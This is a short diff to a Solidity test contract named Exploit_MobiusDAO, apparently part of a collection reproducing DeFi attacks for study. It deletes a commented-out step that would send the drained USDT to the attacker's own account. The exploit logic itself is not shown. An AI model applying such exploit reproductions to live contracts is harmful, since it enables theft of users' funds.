@@ -82,15 +82,6 @@ contract Exploit_MobiusDAO is TestHarness, TokenBalanceTracker{
         logBalancesWithLabel('Attacker Contract', address(this));
         logBalancesWithLabel('Victim', address(victim));
 
-        // console.log('===== STEP 7: Withdraw all USDT to Attacker EOA =====');
-
-        // uint256 usdtBalance = usdt.balanceOf(address(this));
-        // usdt.transfer(tx.origin, usdtBalance);
-
-        // logBalancesWithLabel('Attacker', tx.origin);
-        // logBalancesWithLabel('Attacker Contract', address(this));
-        // logBalancesWithLabel('Victim', address(victim));
-
         console.log('===== Attack completed! =====');
     }
 }
